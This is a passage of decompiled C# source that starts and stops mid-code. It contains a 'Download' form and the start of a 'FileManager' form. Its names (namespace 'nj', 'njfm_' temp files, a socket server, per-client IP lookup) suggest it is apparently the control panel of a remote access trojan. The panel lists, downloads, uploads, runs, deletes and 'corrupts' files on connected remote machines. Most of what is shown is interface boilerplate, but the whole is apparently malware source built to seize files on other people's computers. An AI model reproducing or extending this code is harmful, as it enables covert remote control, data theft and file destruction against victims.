			arg_19D_0.Size = size;
			this.GroupBox1.TabIndex = 6;
			this.GroupBox1.TabStop = false;
			this.Lv1.BackColor = Color.Black;
			this.Lv1.BorderStyle = BorderStyle.FixedSingle;
			this.Lv1.Columns.AddRange(new ColumnHeader[]
			{
				this.ColumnHeader1,
				this.ColumnHeader2
			});
			this.Lv1.Dock = DockStyle.Fill;
			this.Lv1.Font = new Font("Arial", 8f, FontStyle.Bold);
			this.Lv1.ForeColor = SystemColors.MenuBar;
			this.Lv1.FullRowSelect = true;
			this.Lv1.HeaderStyle = ColumnHeaderStyle.None;
			this.Lv1.Items.AddRange(new ListViewItem[]
			{
				listViewItem,
				listViewItem2,
				listViewItem3,
				listViewItem4
			});
			Control arg_2A6_0 = this.Lv1;
			location = new Point(3, 16);
			arg_2A6_0.Location = location;
			this.Lv1.Name = "Lv1";
			Control arg_2D4_0 = this.Lv1;
			size = new Size(469, 74);
			arg_2D4_0.Size = size;
			this.Lv1.TabIndex = 0;
			this.Lv1.UseCompatibleStateImageBehavior = false;
			this.Lv1.View = View.Details;
			this.Button1.BackColor = Color.Black;
			this.Button1.ForeColor = SystemColors.Control;
			Control arg_339_0 = this.Button1;
			location = new Point(480, 0);
			arg_339_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_364_0 = this.Button1;
			size = new Size(122, 93);
			arg_364_0.Size = size;
			this.Button1.TabIndex = 5;
			this.Button1.Text = "Stop";
			this.Button1.UseVisualStyleBackColor = false;
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_3B5_0 = this.ProgressBar1;
			location = new Point(0, 94);
			arg_3B5_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_3E3_0 = this.ProgressBar1;
			size = new Size(602, 10);
			arg_3E3_0.Size = size;
			this.ProgressBar1.TabIndex = 106;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.FromArgb(28, 28, 28);
			size = new Size(602, 104);
			this.ClientSize = size;
			this.Controls.Add(this.ProgressBar1);
			this.Controls.Add(this.GroupBox1);
			this.Controls.Add(this.Button1);
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			size = new Size(618, 138);
			this.MaximumSize = size;
			size = new Size(618, 138);
			this.MinimumSize = size;
			this.Name = "Frm_Dowload";
			this.Text = "Download";
			this.GroupBox1.ResumeLayout(false);
			this.ResumeLayout(false);
		}

		public Frm_Dowload()
		{
			base.FormClosing += new FormClosingEventHandler(this.DW_FormClosing);
			base.Load += new EventHandler(this.DW_Load);
			Frm_Dowload.__ENCAddToList(this);
			this.os = 0;
			base.FormClosing += new FormClosingEventHandler(this.DW_FormClosing);
			base.Load += new EventHandler(this.DW_Load);
			this.os = 0;
			this.InitializeComponent();
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				this.Lv1.Items[2].SubItems[1].Text = FN.Siz((long)(checked(this.ProgressBar1.Value - this.os)));
				this.os = this.ProgressBar1.Value;
				this.Lv1.Items[3].SubItems[1].Text = FN.Siz((long)this.ProgressBar1.Value);
			}
			catch (Exception expr_82)
			{
				ProjectData.SetProjectError(expr_82);
				Exception projectError = expr_82;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void DW_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				this.FS.Close();
			}
			catch (Exception expr_10)
			{
				ProjectData.SetProjectError(expr_10);
				Exception projectError = expr_10;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				this.FS.Dispose();
			}
			catch (Exception expr_3E)
			{
				ProjectData.SetProjectError(expr_3E);
				Exception projectError2 = expr_3E;
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				File.Delete(this.tmp);
			}
			catch (Exception expr_6C)
			{
				ProjectData.SetProjectError(expr_6C);
				Exception projectError3 = expr_6C;
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			this.Button1.Enabled = false;
			this.c.CN = false;
		}

		private void DW_Load(object sender, EventArgs e)
		{
			this.Text = FN.DEB(ref this.FNNNN);
			this.ProgressBar1.Maximum = this.SZ;
			Frm_FileManager frm_FileManager = (Frm_FileManager)sokserver.Gform("fm" + this.osk.ip());
			this.folder = this.osk.Folder + "Downloads\\";
			bool flag = !Directory.Exists(this.folder);
			if (flag)
			{
				Directory.CreateDirectory(this.folder);
			}
			this.folder += new FileInfo(FN.DEB(ref this.FNNNN)).Name;
			this.Lv1.Items[0].SubItems[1].Text = new FileInfo(FN.DEB(ref this.FNNNN)).Name;
			this.Lv1.Items[1].SubItems[1].Text = FN.Siz((long)this.SZ);
			do
			{
				this.tmp = Interaction.Environ("temp") + "\\njfm_" + FN.RN(10);
			}
			while (File.Exists(this.tmp));
			this.FS = new FileStream(this.tmp, FileMode.Append);
			this.Lv1.Items[2].SubItems[1].Text = FN.Siz((long)(checked(this.ProgressBar1.Value - this.os)));
			this.os = this.ProgressBar1.Value;
			this.Lv1.Items[3].SubItems[1].Text = FN.Siz((long)this.ProgressBar1.Value);
			this.Lv1.FX();
			this.Timer1.Enabled = true;
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Stop", false) == 0;
			if (flag)
			{
				this.FS.Close();
				this.FS.Dispose();
				File.Delete(this.tmp);
				this.Button1.Enabled = false;
				this.c.CN = false;
				this.Close();
			}
			else
			{
				this.FS.Close();
				this.FS.Dispose();
				File.Move(this.tmp, this.folder);
			}
		}

		private void GroupBox1_Enter(object sender, EventArgs e)
		{
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_FileManager : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip _StatusStrip1;

		[AccessedThroughProperty("Timer1")]
		private System.Windows.Forms.Timer _Timer1;

		[AccessedThroughProperty("L1")]
		private ListView _L1;

		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		[AccessedThroughProperty("RefreshToolStripMenuItem")]
		private ToolStripMenuItem _RefreshToolStripMenuItem;

		[AccessedThroughProperty("ContextMenuStrip2")]
		private ContextMenuStrip _ContextMenuStrip2;

		[AccessedThroughProperty("UPToolStripMenuItem")]
		private ToolStripMenuItem _UPToolStripMenuItem;

		[AccessedThroughProperty("RefreshToolStripMenuItem1")]
		private ToolStripMenuItem _RefreshToolStripMenuItem1;

		[AccessedThroughProperty("L2")]
		private ListView _L2;

		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader _ColumnHeader4;

		[AccessedThroughProperty("ColumnHeader5")]
		private ColumnHeader _ColumnHeader5;

		[AccessedThroughProperty("RunToolStripMenuItem")]
		private ToolStripMenuItem _RunToolStripMenuItem;

		[AccessedThroughProperty("DeleteToolStripMenuItem")]
		private ToolStripMenuItem _DeleteToolStripMenuItem;

		[AccessedThroughProperty("EditToolStripMenuItem")]
		private ToolStripMenuItem _EditToolStripMenuItem;

		[AccessedThroughProperty("RenameToolStripMenuItem")]
		private ToolStripMenuItem _RenameToolStripMenuItem;

		[AccessedThroughProperty("CopyToolStripMenuItem")]
		private ToolStripMenuItem _CopyToolStripMenuItem;

		[AccessedThroughProperty("CutToolStripMenuItem")]
		private ToolStripMenuItem _CutToolStripMenuItem;

		[AccessedThroughProperty("PastToolStripMenuItem")]
		private ToolStripMenuItem _PastToolStripMenuItem;

		[AccessedThroughProperty("DownloadToolStripMenuItem")]
		private ToolStripMenuItem _DownloadToolStripMenuItem;

		[AccessedThroughProperty("UploadToolStripMenuItem")]
		private ToolStripMenuItem _UploadToolStripMenuItem;

		[AccessedThroughProperty("NewEmptyFileToolStripMenuItem")]
		private ToolStripMenuItem _NewEmptyFileToolStripMenuItem;

		[AccessedThroughProperty("NewFolderToolStripMenuItem")]
		private ToolStripMenuItem _NewFolderToolStripMenuItem;

		[AccessedThroughProperty("OpenFolderToolStripMenuItem")]
		private ToolStripMenuItem _OpenFolderToolStripMenuItem;

		[AccessedThroughProperty("ToolStripStatusLabel1")]
		private ToolStripStatusLabel _ToolStripStatusLabel1;

		[AccessedThroughProperty("SL")]
		private ToolStripStatusLabel _SL;

		[AccessedThroughProperty("pr")]
		private ToolStripProgressBar _pr;

		[AccessedThroughProperty("MG")]
		private ImageList _MG;

		[AccessedThroughProperty("CorrupteToolStripMenuItem")]
		private ToolStripMenuItem _CorrupteToolStripMenuItem;

		[AccessedThroughProperty("ContextMenuStrip3")]
		private ContextMenuStrip _ContextMenuStrip3;

		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		[AccessedThroughProperty("RefreshToolStripMenuItem2")]
		private ToolStripMenuItem _RefreshToolStripMenuItem2;

		[AccessedThroughProperty("ToolStripMenuItem2")]
		private ToolStripMenuItem _ToolStripMenuItem2;

		[AccessedThroughProperty("DeleteToolStripMenuItem1")]
		private ToolStripMenuItem _DeleteToolStripMenuItem1;

		[AccessedThroughProperty("EditToolStripMenuItem1")]
		private ToolStripMenuItem _EditToolStripMenuItem1;

		[AccessedThroughProperty("ToolStripMenuItem3")]
		private ToolStripMenuItem _ToolStripMenuItem3;

		[AccessedThroughProperty("ToolStripMenuItem4")]
		private ToolStripMenuItem _ToolStripMenuItem4;

		[AccessedThroughProperty("ToolStripMenuItem5")]
		private ToolStripMenuItem _ToolStripMenuItem5;

		[AccessedThroughProperty("PasteToolStripMenuItem")]
		private ToolStripMenuItem _PasteToolStripMenuItem;

		[AccessedThroughProperty("ToolStripMenuItem6")]
		private ToolStripMenuItem _ToolStripMenuItem6;

		[AccessedThroughProperty("ToolStripMenuItem7")]
		private ToolStripMenuItem _ToolStripMenuItem7;

		[AccessedThroughProperty("ToolStripMenuItem8")]
		private ToolStripMenuItem _ToolStripMenuItem8;

		[AccessedThroughProperty("ToolStripMenuItem9")]
		private ToolStripMenuItem _ToolStripMenuItem9;

		[AccessedThroughProperty("OpenDownloadsToolStripMenuItem")]
		private ToolStripMenuItem _OpenDownloadsToolStripMenuItem;

		[AccessedThroughProperty("RarToolStripMenuItem")]
		private ToolStripMenuItem _RarToolStripMenuItem;

		[AccessedThroughProperty("UnRarToolStripMenuItem")]
		private ToolStripMenuItem _UnRarToolStripMenuItem;

		[AccessedThroughProperty("UploadFromLinkToolStripMenuItem")]
		private ToolStripMenuItem _UploadFromLinkToolStripMenuItem;

		[AccessedThroughProperty("ContextMenuStrip4")]
		private ContextMenuStrip _ContextMenuStrip4;

		[AccessedThroughProperty("ToolStripMenuItem10")]
		private ToolStripMenuItem _ToolStripMenuItem10;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		[AccessedThroughProperty("Timer2")]
		private System.Windows.Forms.Timer _Timer2;

		[AccessedThroughProperty("MG2")]
		private ImageList _MG2;

		[AccessedThroughProperty("MG1")]
		private ImageList _MG1;

		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		[AccessedThroughProperty("ColerToolStripMenuItem")]
		private ToolStripMenuItem _ColerToolStripMenuItem;

		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		[AccessedThroughProperty("Button5")]
		private Button _Button5;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("Button4")]
		private Button _Button4;

		[AccessedThroughProperty("Panel2")]
		private Panel _Panel2;

		public Collection Cache;

		public string Flist;

		private string folder;

		public Collection Images;

		public bool isCut;

		public Client osk;

		public PictureBox P;

		public string QQ;

		public Client sk;

		internal virtual StatusStrip StatusStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip1 = value;
			}
		}

		internal virtual System.Windows.Forms.Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual ListView L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.L1_DoubleClick);
				bool flag = this._L1 != null;
				if (flag)
				{
					this._L1.DoubleClick -= value2;
				}
				this._L1 = value;
				flag = (this._L1 != null);
				if (flag)
				{
					this._L1.DoubleClick += value2;
				}
			}
		}

		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				CancelEventHandler value2 = new CancelEventHandler(this.ContextMenuStrip1_Opening);
				bool flag = this._ContextMenuStrip1 != null;
				if (flag)
				{
					this._ContextMenuStrip1.Opening -= value2;
				}
				this._ContextMenuStrip1 = value;
				flag = (this._ContextMenuStrip1 != null);
				if (flag)
				{
					this._ContextMenuStrip1.Opening += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RefreshToolStripMenuItem = value;
			}
		}

		internal virtual ContextMenuStrip ContextMenuStrip2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip2 = value;
			}
		}

		internal virtual ToolStripMenuItem UPToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UPToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UPToolStripMenuItem_Click);
				bool flag = this._UPToolStripMenuItem != null;
				if (flag)
				{
					this._UPToolStripMenuItem.Click -= value2;
				}
				this._UPToolStripMenuItem = value;
				flag = (this._UPToolStripMenuItem != null);
				if (flag)
				{
					this._UPToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem RefreshToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RefreshToolStripMenuItem1 = value;
			}
		}

		internal virtual ListView L2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.L2_SelectedIndexChanged);
				EventHandler value3 = new EventHandler(this.L2_DoubleClick);
				bool flag = this._L2 != null;
				if (flag)
				{
					this._L2.SelectedIndexChanged -= value2;
					this._L2.DoubleClick -= value3;
				}
				this._L2 = value;
				flag = (this._L2 != null);
				if (flag)
				{
					this._L2.SelectedIndexChanged += value2;
					this._L2.DoubleClick += value3;
				}
			}
		}

		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader4 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader5 = value;
			}
		}

		internal virtual ToolStripMenuItem RunToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RunToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RunToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem DeleteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DeleteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._DeleteToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem EditToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._EditToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EditToolStripMenuItem_Click);
				bool flag = this._EditToolStripMenuItem != null;
				if (flag)
				{
					this._EditToolStripMenuItem.Click -= value2;
				}
				this._EditToolStripMenuItem = value;
				flag = (this._EditToolStripMenuItem != null);
				if (flag)
				{
					this._EditToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem RenameToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RenameToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RenameToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem CopyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CopyToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem CutToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CutToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CutToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem PastToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PastToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PastToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem DownloadToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DownloadToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._DownloadToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem UploadToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UploadToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._UploadToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem NewEmptyFileToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NewEmptyFileToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NewEmptyFileToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem NewFolderToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NewFolderToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NewFolderToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripMenuItem OpenFolderToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenFolderToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._OpenFolderToolStripMenuItem = value;
			}
		}

		internal virtual ToolStripStatusLabel ToolStripStatusLabel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripStatusLabel1 = value;
			}
		}

		internal virtual ToolStripStatusLabel SL
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SL;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SL = value;
			}
		}

		internal virtual ToolStripProgressBar pr
		{
			[DebuggerNonUserCode]
			get
			{
				return this._pr;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._pr = value;
			}
		}

		internal virtual ImageList MG
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MG;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MG = value;
			}
		}

		internal virtual ToolStripMenuItem CorrupteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CorrupteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CorrupteToolStripMenuItem_Click);
				bool flag = this._CorrupteToolStripMenuItem != null;
				if (flag)
				{
					this._CorrupteToolStripMenuItem.Click -= value2;
				}
				this._CorrupteToolStripMenuItem = value;
				flag = (this._CorrupteToolStripMenuItem != null);
				if (flag)
				{
					this._CorrupteToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ContextMenuStrip ContextMenuStrip3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				CancelEventHandler value2 = new CancelEventHandler(this.ContextMenuStrip3_Opening);
				bool flag = this._ContextMenuStrip3 != null;
				if (flag)
				{
					this._ContextMenuStrip3.Opening -= value2;
				}
				this._ContextMenuStrip3 = value;
				flag = (this._ContextMenuStrip3 != null);
				if (flag)
				{
					this._ContextMenuStrip3.Opening += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click_1);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				flag = (this._ToolStripMenuItem1 != null);
				if (flag)
				{
					this._ToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem RefreshToolStripMenuItem2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem2_Click);
				bool flag = this._RefreshToolStripMenuItem2 != null;
				if (flag)
				{
					this._RefreshToolStripMenuItem2.Click -= value2;
				}
				this._RefreshToolStripMenuItem2 = value;
				flag = (this._RefreshToolStripMenuItem2 != null);
				if (flag)
				{
					this._RefreshToolStripMenuItem2.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem2_Click);
				bool flag = this._ToolStripMenuItem2 != null;
				if (flag)
				{
					this._ToolStripMenuItem2.Click -= value2;
				}
				this._ToolStripMenuItem2 = value;
				flag = (this._ToolStripMenuItem2 != null);
				if (flag)
				{
					this._ToolStripMenuItem2.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem DeleteToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DeleteToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteToolStripMenuItem1_Click);
				bool flag = this._DeleteToolStripMenuItem1 != null;
				if (flag)
				{
					this._DeleteToolStripMenuItem1.Click -= value2;
				}
				this._DeleteToolStripMenuItem1 = value;
				flag = (this._DeleteToolStripMenuItem1 != null);
				if (flag)
				{
					this._DeleteToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem EditToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._EditToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EditToolStripMenuItem1_Click);
				bool flag = this._EditToolStripMenuItem1 != null;
				if (flag)
				{
					this._EditToolStripMenuItem1.Click -= value2;
				}
				this._EditToolStripMenuItem1 = value;
				flag = (this._EditToolStripMenuItem1 != null);
				if (flag)
				{
					this._EditToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem3_Click);
				bool flag = this._ToolStripMenuItem3 != null;
				if (flag)
				{
					this._ToolStripMenuItem3.Click -= value2;
				}
				this._ToolStripMenuItem3 = value;
				flag = (this._ToolStripMenuItem3 != null);
				if (flag)
				{
					this._ToolStripMenuItem3.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem4_Click);
				bool flag = this._ToolStripMenuItem4 != null;
				if (flag)
				{
					this._ToolStripMenuItem4.Click -= value2;
				}
				this._ToolStripMenuItem4 = value;
				flag = (this._ToolStripMenuItem4 != null);
				if (flag)
				{
					this._ToolStripMenuItem4.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem5_Click);
				bool flag = this._ToolStripMenuItem5 != null;
				if (flag)
				{
					this._ToolStripMenuItem5.Click -= value2;
				}
				this._ToolStripMenuItem5 = value;
				flag = (this._ToolStripMenuItem5 != null);
				if (flag)
				{
					this._ToolStripMenuItem5.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem PasteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PasteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PasteToolStripMenuItem_Click_1);
				bool flag = this._PasteToolStripMenuItem != null;
				if (flag)
				{
					this._PasteToolStripMenuItem.Click -= value2;
				}
				this._PasteToolStripMenuItem = value;
				flag = (this._PasteToolStripMenuItem != null);
				if (flag)
				{
					this._PasteToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem6_Click);
				bool flag = this._ToolStripMenuItem6 != null;
				if (flag)
				{
					this._ToolStripMenuItem6.Click -= value2;
				}
				this._ToolStripMenuItem6 = value;
				flag = (this._ToolStripMenuItem6 != null);
				if (flag)
				{
					this._ToolStripMenuItem6.Click += value2;
